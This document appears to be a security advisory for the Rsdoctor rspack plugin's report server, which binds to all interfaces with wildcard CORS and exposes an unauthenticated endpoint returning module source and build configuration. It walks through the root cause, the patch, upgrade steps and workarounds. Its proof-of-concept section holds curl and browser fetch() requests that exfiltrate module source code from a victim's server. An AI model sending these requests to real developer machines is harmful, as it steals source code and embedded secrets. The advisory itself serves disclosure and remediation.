@@ -1,0 +1,232 @@
+Summary
+The default Rsdoctor report HTTP server started by @rsdoctor/rspack-plugin binds to all network interfaces (0.0.0.0) and serves a POST /api/data/key endpoint with no authentication and wildcard CORS (Access-Control-Allow-Origin: *). Any network-adjacent or remote attacker can send a single unauthenticated request to retrieve the full source code of all compiled JavaScript modules (moduleCodeMap), serialized build configuration (configs), error details, and other sensitive build metadata. This server is enabled by default in non-CI environments, requiring no special configuration from the victim developer.
+
+Details
+Root cause: server binds to all interfaces with no authentication and no key allowlist.
+
+The vulnerability is composed of four independently observable defects that together create a complete unauthenticated information-disclosure path:
+
+1. Server binds to 0.0.0.0 (all interfaces)
+
+packages/utils/src/build/server.ts:107 calls server.listen(port, callback) without a host argument. Node.js defaults to 0.0.0.0, exposing the server on every network interface of the developer's machine, including LAN interfaces.
+
+// packages/utils/src/build/server.ts:83,107
+server.listen(port, () => {   // no host → 0.0.0.0
+  resolve(res);
+});
+2. Wildcard CORS enabled unconditionally
+
+packages/sdk/src/sdk/server/index.ts:106 applies cors() middleware with no origin restriction, and :203–204 additionally sets Access-Control-Allow-Origin: * explicitly on every API response, allowing cross-origin browser requests from any domain.
+
+// packages/sdk/src/sdk/server/index.ts:106
+this.app.use(cors());
+// :203
+res.setHeader('Access-Control-Allow-Origin', '*');
+res.setHeader('Access-Control-Allow-Credentials', 'true');
+3. POST /api/data/key registered with no authentication middleware
+
+packages/sdk/src/sdk/server/apis/data.ts:6 registers the route via @Router.post. There is no authentication guard, token check, or session validation anywhere in the middleware chain.
+
+// packages/sdk/src/sdk/server/apis/data.ts:6,13,29
+@Router.post(SDK.ServerAPI.API.LoadDataByKey)
+public async loadDataByKey() {
+  let { key } = req.body as SDK.ServerAPI.InferRequestBodyType<SDK.ServerAPI.API.LoadDataByKey>;
+  const data = await this.loadData(key);
+  return data;
+}
+4. key is passed to getStoreData() without an allowlist
+
+packages/sdk/src/sdk/server/apis/base.ts:29–39 indexes the entire SDK data store directly using the attacker-controlled key, including dot-path traversal for nested keys.
+
+// packages/sdk/src/sdk/server/apis/base.ts:29,33,35-36
+const data = this.ctx.sdk.getStoreData();
+let res = data[key];
+if (key.includes(sep)) {
+  res = key.split(sep).reduce((t, k) => t[k], data);
+}
+return res;
+Source-to-sink data flow:
+
+Step	Location	Description
+1	packages/rspack-plugin/src/plugin.ts:111	Plugin bootstraps the SDK server during build
+2	packages/core/src/inner-plugins/utils/config.ts:98,110–115	disableClientServer defaults to false; server starts in all non-CI builds
+3	packages/utils/src/build/server.ts:83,107	HTTP server created and bound to 0.0.0.0
+4	packages/sdk/src/sdk/server/index.ts:106,203	Wildcard CORS applied unconditionally
+5	packages/sdk/src/sdk/server/apis/data.ts:6,13,29	Attacker key accepted from request body
+6	packages/sdk/src/sdk/server/apis/base.ts:29,36,39	key indexes sdk.getStoreData() with no allowlist
+7	packages/sdk/src/sdk/sdk/index.ts:487,491	moduleCodeMap getter calls _moduleGraph.toCodeData()
+8	packages/graph/src/graph/module-graph/graph.ts:464–469	toCodeData() returns all module source objects
+9	packages/graph/src/graph/module-graph/module.ts:248–250	Each module exposes source, transformed, and parsedSource
+10	packages/sdk/src/sdk/server/router.ts:119,125	Serialized result written to HTTP response
+Default configuration ensures source code is captured:
+
+packages/core/src/inner-plugins/utils/config.ts shows that noModuleSource, noAssetsAndModuleSource, and noCode all default to false, causing normalizeReportType to return SDK.ToDataType.Normal. This means module source code is stored in the SDK data store by default and retrievable via the moduleCodeMap key.
+
+PoC
+Original PoC
+Environment setup:
+
+Exploit (from any host on the same LAN, no authentication):
+
+# Primary probe: exfiltrate all module source code
+curl -s "http://<victim-lan-ip>:<port>/api/data/key" \
+  -H 'Content-Type: application/json' \
+  --data '{"key":"moduleCodeMap"}'
+# Response: full source code of every compiled module, including secrets
+Expected response (excerpt):
+
+{
+  "...": "...",
+  "source": "const INTERNAL_API_KEY = 'rsdoctor-secret-marker-123';\nconsole.log(INTERNAL_API_KEY);\n",
+  "...": "..."
+}
+Secondary probe: exfiltrate build configuration and local paths:
+
+curl -s "http://<victim-lan-ip>:<port>/api/data/key" \
+  -H 'Content-Type: application/json' \
+  --data '{"key":"configs"}'
+# Response: 9,278 bytes of serialized build configuration including absolute file paths
+Automated PoC (Docker-based, self-contained reproduction):
+
+The Docker-based reproduction builds and starts the vulnerable project inside a container, then executes poc.py to confirm source code exfiltration. The PoC embeds the marker string rsdoctor-vuln-001-secret-EXFIL-abc123 in the compiled source and asserts its presence in the unauthenticated API response:
+
+Minimal browser-based PoC
+A malicious website can also attempt to read data from a local Rsdoctor report server by sending a browser request to 127.0.0.1 or localhost.
+
+fetch('http://127.0.0.1:<rsdoctor-port>/api/data/key', {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json',
+  },
+  body: JSON.stringify({
+    key: 'moduleCodeMap',
+  }),
+})
+  .then((res) => res.json())
+  .then(console.log);
+If the report server is reachable over the local network, an attacker may also target the victim machine's LAN address:
+
+fetch('http://<victim-lan-ip>:<rsdoctor-port>/api/data/key', {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json',
+  },
+  body: JSON.stringify({
+    key: 'moduleCodeMap',
+  }),
+})
+  .then((res) => res.json())
+  .then(console.log);
+In affected versions, the response may contain sensitive build metadata or compiled module source code.
+
+Impact
+This is an unauthenticated remote information disclosure vulnerability. Any attacker who can reach the developer's machine over the network (LAN, VPN, shared Wi-Fi, corporate network) can retrieve:
+
+Full JavaScript source code of every module compiled during the build, including any secrets, API keys, or proprietary business logic embedded in the source (moduleCodeMap)
+Serialized build configuration, including absolute local file paths, resolver settings, and plugin configurations (configs)
+Build errors that may contain stack traces with internal paths (errors)
+Environment information (envinfo)
+The server is started automatically whenever a developer runs a build with the Rsdoctor plugin outside of a CI environment (disableClientServer defaults to false). No user interaction or special configuration is required from the victim. A single unauthenticated HTTP POST request is sufficient to exfiltrate all module source code.
+
+Impacted parties include individual developers and organizations whose developers run Rsdoctor on machines connected to any shared or semi-trusted network, and any CI system that runs Rsdoctor in a non-CI-detected environment.
+
+Patched Behavior
+The patched version changes the report server's default security model:
+
+The report server binds to 127.0.0.1 by default.
+Default CORS no longer allows arbitrary origins.
+Default CORS only allows local origins such as localhost, *.localhost, 127.0.0.1, and [::1].
+Passing a partial CORS object preserves the default local-origin protection.
+HTTP requests are rejected when the request host is not allowed.
+The report WebSocket requires a per-server token.
+The report UI receives the tokenized socket URL through runtime report data and uses that URL to connect.
+Upgrade Path
+Upgrade Rsdoctor packages to the patched version:
+
+pnpm add -D @rsdoctor/rspack-plugin@^1.5.16
+Most users do not need additional configuration after upgrading.
+
+CORS Configuration Behavior
+The patched version aligns Rsdoctor's CORS behavior with a safer default model. In particular, partial CORS options no longer drop the default local-origin protection.
+
+User configuration server.cors	Effective CORS behavior
+undefined	Enables CORS for default local origins only
+false	Disables CORS middleware
+true	Uses cors({}); effectively allows arbitrary origins and is not recommended
+{ credentials: true }	Keeps default local origins and adds credentials: true
+{ origin: 'https://example.com' }	Allows only the configured origin
+{ origin: '*' }	Allows arbitrary origins and is not recommended
+{ origin: false }	Does not set Access-Control-Allow-Origin
+{ origin: fn }	Uses the custom origin function
+{ origin: /regex/ }	Uses the custom regular expression
+Recommended configuration
+For most users, leave server.cors unset:
+
+new RsdoctorRspackPlugin();
+If another local development frontend needs to access the report server, configure an exact origin:
+
+new RsdoctorRspackPlugin({
+  server: {
+    cors: {
+      origin: 'http://localhost:3000',
+      credentials: true,
+    },
+  },
+});
+Avoid permissive CORS configuration:
+
+new RsdoctorRspackPlugin({
+  server: {
+    cors: true,
+  },
+});
+new RsdoctorRspackPlugin({
+  server: {
+    cors: {
+      origin: '*',
+    },
+  },
+});
+These configurations explicitly opt out of the safer default CORS behavior.
+
+Breaking Changes
+The patched version intentionally tightens the report server's access model.
+
+1. The report server is local-only by default
+The report server is no longer intended to be accessed from arbitrary LAN hosts or remote machines by default.
+
+If your workflow depended on opening the Rsdoctor report server from another device on the network, that workflow may stop working after upgrading. The recommended approach is to access the report from the same machine that started the build, or to use generated static report output instead of exposing the development report server.
+
+2. Cross-origin access is restricted by default
+Web pages from non-local origins can no longer read report server responses by default.
+
+If you have a trusted local integration, configure the exact allowed origin through server.cors.origin.
+
+3. Custom WebSocket clients must use the tokenized socket URL
+The report WebSocket now requires a per-server token.
+
+Custom clients must not construct the socket URL manually, for example:
+
+new WebSocket('ws://localhost:<port>');
+Instead, they must use the tokenized socket URL provided by the report runtime data.
+
+4. server.cors: true remains an explicit opt-out
+server.cors: true uses the default behavior of the cors middleware and is effectively permissive. This behavior is kept for compatibility, but it is not recommended for untrusted environments.
+
+Workarounds
+If upgrading immediately is not possible, users can reduce exposure by disabling the report server:
+
+new RsdoctorRspackPlugin({
+  disableClientServer: true,
+});
+Additional mitigations:
+
+Do not expose the report server port to untrusted networks.
+Do not use server.cors: true.
+Do not use server.cors.origin: '*'.
+Run builds only in trusted local environments.
+Block external access to the report server port with firewall rules.
+These workarounds do not fully address every attack path. Upgrading to a patched version is recommended.
+
+Reproduction artifacts
+Dockerfile
